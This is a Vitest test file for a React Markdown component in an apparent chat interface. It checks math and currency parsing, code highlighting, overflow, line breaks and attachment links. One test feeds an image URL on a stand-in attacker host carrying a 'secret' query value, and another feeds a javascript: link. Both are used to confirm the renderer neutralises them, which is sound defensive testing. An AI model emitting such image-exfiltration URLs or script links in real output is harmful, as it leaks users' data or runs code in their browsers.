import { describe, expect, it } from 'vitest'
import { renderToStaticMarkup } from 'react-dom/server'
import type { Attachment } from '@/lib/types'
import { Markdown } from './Markdown'
import { linkedAttachment, MarkdownAttachmentsContext } from './markdown-file-links'

describe('Markdown responsive containment', () => {
  it('renders currency signs as prose instead of pairing them as inline math', () => {
    const markup = renderToStaticMarkup(
      <Markdown content={'Click the **$** dropdown, or choose Accounting if you want the $ aligned. Costs are $5 and $10.'} />,
    )

    expect(markup).toContain('<strong class="font-semibold">$</strong>')
    expect(markup).toContain('the $ aligned')
    expect(markup).toContain('Costs are $5 and $10')
    expect(markup).not.toContain('class="katex"')
  })

  it('renders conventional single-dollar inline math', () => {
    const markup = renderToStaticMarkup(
      <Markdown content={String.raw`$F_{AB} = -A_x = 199$ lb and $100.5\sqrt{2} \approx 142.1$ lb`} />,
    )

    expect(markup.match(/class="katex"/g)).toHaveLength(2)
    expect(markup).not.toContain('$F_{AB}')
  })

  it('keeps emphasized currency amounts out of math spans', () => {
    const content = 'Ask why future payments are **$22.92** when the policy displays **$20.67/month**.'
    const markup = renderToStaticMarkup(<Markdown content={content} />)

    expect(markup).toContain('<strong class="font-semibold">$22.92</strong>')
    expect(markup).toContain('<strong class="font-semibold">$20.67/month</strong>')
    expect(markup).not.toContain('class="katex"')
  })

  it('still renders explicit inline and display math delimiters', () => {
    const markup = renderToStaticMarkup(
      <Markdown content={String.raw`Inline \(E=mc^2\) and display \[x^2 + y^2\]`} />,
    )

    expect(markup.match(/class="katex"/g)).toHaveLength(2)
    expect(markup).toContain('katex-display')
  })

  it('renders a boxed minipage document as prose with its equations', () => {
    const content = String.raw`Here is a problem:

\[
\boxed{
\begin{minipage}{0.98\linewidth}
\textbf{Problem.} Let $n\ge 3$ and
\[
L=D-W,\qquad W_{ij}=
\begin{cases}
w_{ij}, & (i,j)\in E,\\
0, & (i,j)\notin E.
\end{cases}
\]
\end{minipage}
}
\]

Then $x\in\mathbb{R}^n$.`
    const markup = renderToStaticMarkup(<Markdown content={content} />)

    expect(markup).toContain('<strong class="font-semibold">Problem.</strong>')
    expect(markup).not.toContain('minipage')
    expect(markup).not.toContain('katex-error')
    expect(markup).not.toContain('>latex</span>')
    expect(markup.match(/class="katex-display"/g)).toHaveLength(1)
    expect(markup.match(/class="katex"/g)).toHaveLength(3)
  })

  it('shows display math KaTeX cannot parse as a LaTeX code block', () => {
    const content = String.raw`Here is a table:

\[
\begin{tabular}{cc}
a & b \\
c & d
\end{tabular}
\]

Then $x\in\mathbb{R}^n$.`
    const markup = renderToStaticMarkup(<Markdown content={content} />)

    expect(markup).not.toContain('katex-error')
    expect(markup).toContain('>latex</span>')
    expect(markup).toContain(String.raw`\begin{tabular}{cc}
a &amp; b \\
c &amp; d
\end{tabular}</code>`)
    expect(markup.match(/class="katex"/g)).toHaveLength(1)
  })

  it('keeps inline math errors inline', () => {
    const markup = renderToStaticMarkup(<Markdown content={String.raw`Bad $\begin{minipage}$ math.`} />)

    expect(markup).toContain('katex-error')
    expect(markup).not.toContain('>latex</span>')
  })

  it.each(['# Heading', '## Heading', '### Heading'])('removes top spacing from an initial heading: %s', (content) => {
    const markup = renderToStaticMarkup(<Markdown content={content} />)

    expect(markup).toContain('first:mt-0')
  })

  it('allows prose and inline code to break without widening the chat column', () => {
    const markup = renderToStaticMarkup(
      <Markdown content={'https://example.com/an-unbroken-path-without-natural-breaks `anUnbrokenInlineCodeValue`'} />,
    )

    expect(markup).toContain('markdown-content')
    expect(markup).toContain('[overflow-wrap:anywhere]')
  })

  it('colours fenced code tokens but leaves inline code plain', () => {
    const markup = renderToStaticMarkup(
      <Markdown content={'Use `const` here:\n\n```c++\nint main() { return 0; }\n```'} />,
    )

    expect(markup).toContain('>c++</span>')
    expect(markup).toContain('<code class="code-highlight font-mono">')
    expect(markup).toContain('<span class="hljs-keyword">return</span>')
    expect(markup).toMatch(/<code class="rounded-\[4px\][^>]*>const<\/code>/)
  })

  it('keeps wide code and tables inside local overflow containers', () => {
    const markup = renderToStaticMarkup(
      <Markdown content={'```js\nconst unbrokenValue = "abcdefghijklmnopqrstuvwxyz0123456789"\n```\n\n| heading |\n| --- |\n| abcdefghijklmnopqrstuvwxyz0123456789 |'} />,
    )

    expect(markup).toContain('group/code my-3 min-w-0 max-w-full overflow-hidden')
    expect(markup).toContain('max-w-full overflow-x-auto')
    expect(markup).toContain('my-3 max-w-full overflow-x-auto')
    expect(markup).not.toContain('<pre><div')
  })
})

describe('Markdown images', () => {
  it('renders remote images as links instead of loading them', () => {
    const markup = renderToStaticMarkup(<Markdown content={'![chart](https://attacker.test/p.png?d=secret) ![](https://x.test/q.gif)'} />)

    expect(markup).not.toContain('<img')
    expect(markup).toContain('href="https://attacker.test/p.png?d=secret"')
    expect(markup).toContain('attacker.test')
    expect(markup).toContain('chart')
  })
})

describe('Markdown line breaks', () => {
  it('collapses single newlines by default, as CommonMark does', () => {
    const markup = renderToStaticMarkup(<Markdown content={'this\nis\nan example'} />)

    expect(markup).not.toContain('<br/>')
  })

  it('keeps single newlines as line breaks when asked', () => {
    const markup = renderToStaticMarkup(<Markdown content={'this\nis\nan *example*\n\nnext paragraph'} breaks />)

    expect(markup).toContain('<p class="my-2 leading-7 first:mt-0 last:mb-0">this<br/>\nis<br/>\nan <em>example</em></p>')
    expect(markup).toContain('next paragraph</p>')
  })

  it('leaves newlines inside code and math alone', () => {
    const markup = renderToStaticMarkup(<Markdown content={'```\nline one\nline two\n```\n\n$$\na\n= b\n$$'} breaks />)

    expect(markup).not.toContain('<br/>')
    expect(markup).toContain('line one')
    expect(markup).toContain('katex-display')
  })
})

describe('Markdown file links', () => {
  const chart: Attachment = { id: 'att-1', name: 'chart.png', mimeType: 'image/png', type: 'image', size: 10 }
  const withAttachments = (content: string, attachments: Attachment[]) => renderToStaticMarkup(
    <MarkdownAttachmentsContext.Provider value={{ attachments, download: () => {} }}><Markdown content={content} /></MarkdownAttachmentsContext.Provider>,
  )

  it('downloads the attached file a workspace link names instead of opening a tab', () => {
    for (const href of ['sandbox:/mnt/data/chart.png', '/workspace/chart.png', 'chart.png', 'file:///workspace/out/chart.png']) {
      const markup = withAttachments(`[Download PNG](${href})`, [chart])
      expect(markup).toContain('<button type="button" title="Download chart.png"')
      expect(markup).not.toContain('<a ')
    }
  })

  it('renders links to files that were not attached as plain text', () => {
    for (const href of ['sandbox:/mnt/data/chart.png', '/workspace/chart.png', 'javascript:alert(1)']) {
      const markup = renderToStaticMarkup(<Markdown content={`[Download PNG](${href})`} />)
      expect(markup).toContain('<span>Download PNG</span>')
      expect(markup).not.toContain('href')
    }
  })

  it('keeps web links as links', () => {
    const markup = withAttachments('[chart.png](https://example.com/chart.png)', [chart])
    expect(markup).toContain('href="https://example.com/chart.png"')
  })

  it('downloads an attached image the model embedded by workspace path', () => {
    const markup = withAttachments('![Sales chart](sandbox:/mnt/data/chart.png)', [chart])
    expect(markup).toContain('<button type="button" title="Download chart.png"')
    expect(markup).not.toContain('href')
  })
})

describe('linkedAttachment', () => {
  const file = (name: string): Attachment => ({ id: name, name, mimeType: 'application/octet-stream', type: 'file', size: 1 })

  it('matches by file name, then by the only attachment of that type', () => {
    expect(linkedAttachment('sandbox:/mnt/data/Report%20Final.PDF', [file('a.pdf'), file('report final.pdf')])?.name).toBe('report final.pdf')
    expect(linkedAttachment('/workspace/chart.png', [file('sales-chart.png'), file('data.csv')])?.name).toBe('sales-chart.png')
    expect(linkedAttachment('/workspace/chart.png', [file('a.png'), file('b.png')])).toBeNull()
  })

  it('ignores web links and in-page anchors', () => {
    expect(linkedAttachment('https://example.com/a.png', [file('a.png')])).toBeNull()
    expect(linkedAttachment('//example.com/a.png', [file('a.png')])).toBeNull()
    expect(linkedAttachment('#a.png', [file('a.png')])).toBeNull()
  })
})
